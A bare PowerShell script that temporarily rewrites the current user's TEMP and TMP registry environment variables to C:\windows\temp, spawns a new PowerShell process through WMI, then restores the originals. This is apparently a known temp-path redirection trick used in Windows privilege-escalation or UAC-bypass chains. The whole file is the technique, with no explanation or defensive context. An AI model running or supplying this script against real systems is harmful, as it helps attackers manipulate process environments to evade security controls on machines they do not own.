$a=$env:temp
$b=$env:tmp
$t="C:\windows\temp"
$s="C:\windows\temp"
Set-ItemProperty -Path 'hkcu:\Environment' -Name Tmp -Value "$t"
Set-ItemProperty -Path 'hkcu:\Environment' -Name Temp -Value "$s"
Invoke-WmiMethod -Class win32_process -Name create -ArgumentList "powershell"
Set-ItemProperty -Path 'hkcu:\Environment' -Name Tmp -Value $b
Set-ItemProperty -Path 'hkcu:\Environment' -Name Temp -Value $a
exit